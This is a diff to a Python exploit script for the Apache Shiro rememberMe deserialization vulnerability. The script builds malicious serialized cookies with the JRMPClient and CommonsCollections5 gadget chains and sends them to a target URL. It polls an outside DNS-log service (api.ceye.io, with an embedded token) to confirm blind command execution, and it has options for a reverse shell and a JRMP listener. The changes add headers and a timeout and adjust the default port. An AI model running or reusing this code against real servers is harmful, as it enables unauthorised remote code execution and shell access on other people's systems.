@@ -23,6 +23,10 @@ class Shiro_RememberMe(object):
         self.parseArguments()
         self._EXP_class = ["JRMPClient",'CommonsCollections5']
         
+        self.headers = {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
+        }
         if self.proxy:
             self.proxies = {
                 "http": self.proxy,
@@ -41,7 +45,6 @@ class Shiro_RememberMe(object):
                 if not self.ip:
                     print("Confirm your server ip!")
                     exit(0)
-                key = "kPH+bIxk5D2deZiIxcaaaA=="
                 self.attck(key)
 
     def encode_rememberme(self,_EXP_class,key,command):
@@ -71,11 +74,11 @@ class Shiro_RememberMe(object):
                 print("[*] Using Key: {}".format(key))
                 base64_ciphertext = self.encode_rememberme(self._EXP_class[0],key,command)
                 print("[*] base64_decodeTXT: rememberMe={}".format(base64_ciphertext.decode()))
-                response = requests.post(self.url, timeout=1, verify=False,cookies={"rememberMe": base64_ciphertext.decode()},proxies=self.proxies) # proxies=self.proxy
+                response = requests.post(self.url,headers=self.headers,verify=False,proxies=self.proxies,timeout=self.timeout,cookies={'rememberMe':base64_ciphertext.decode()})
                 if response.status_code == 500:
                     raise Exception("Network error occurred in the first request")
                 print ('[*] Request to target URL success!\n')
-                req = requests.get('http://api.ceye.io/v1/records?token=603fd72e8621857c2b4c116fc5c1ede7&type=dns',timeout=5,proxies=self.proxies)
+                req = requests.get('http://api.ceye.io/v1/records?token=603fd72e8621857c2b4c116fc5c1ede7&type=dns',timeout=self.timeout,proxies=self.proxies)
                 if req.status_code == 500:
                     raise Exception("Network error occurred in the second request")
                 if command in req.text:
@@ -98,7 +101,7 @@ class Shiro_RememberMe(object):
 
         base64_ciphertext = self.encode_rememberme(self._EXP_class[0],key,self.ip+":"+self.JRMPListener)
         print("\033[01;34m[*] base64_decodeTXT\033[0m: \n\033[1;31mrememberMe={}\033[0m".format(base64_ciphertext.decode()))
-        response = requests.post(self.url, timeout=20, verify=False,cookies={"rememberMe": base64_ciphertext.decode()},proxies=self.proxies) #proxies=self.proxy
+        response = requests.post(self.url, timeout=self.timeout,headers=self.headers, verify=False,cookies={"rememberMe": base64_ciphertext.decode()},proxies=self.proxies)
         if response.status_code == 500:
             print("Network error....")
             exit(0)
@@ -109,11 +112,11 @@ class Shiro_RememberMe(object):
         mandatory = OptionGroup(parser, 'Mandatory')
         mandatory.add_option('-u', '--url', help='URL target', action='store', type='string', dest='url', default=None)
         mandatory.add_option('--ip', '--reflex_IP', help='反弹shell的IP 默认当前外网地址', action='store', dest='reflexIP', default=None)
-        mandatory.add_option('--port', '--reflex_PORT', help='反弹shell的PORT 默认8888', action='store', dest='reflexPORT', default='8888')
+        mandatory.add_option('--port', '--reflex_PORT', help='反弹shell的PORT 默认8000', action='store', dest='reflexPORT', default='8000')
         mandatory.add_option('-l', '--JRMPListener', help='监听地址 默认3888', action='store', dest='JRMPListener', default='3888')
         mandatory.add_option('--proxy', '--http-proxy', action='store', dest='httpProxy', type='string', help='Http Proxy (example: localhost:8080')
         mandatory.add_option('--shell', '--reverse-Shell',  dest='shell', type='string',default=False, help='reverse-Shell [Arbitrary parameter]')
-
+        mandatory.add_option('--time', '--timeout',  dest='timeout', type='string',default=5, help='Connection timeout')
         parser.add_option_group(mandatory)
         options, arguments = parser.parse_args()
         self.url = options.url
@@ -122,6 +125,7 @@ class Shiro_RememberMe(object):
         self.ip = options.reflexIP
         self.port = options.reflexPORT
         self.reverse_Shell = options.shell
+        self.timeout = int(options.timeout)
         return options
 
 if __name__ == "__main__":
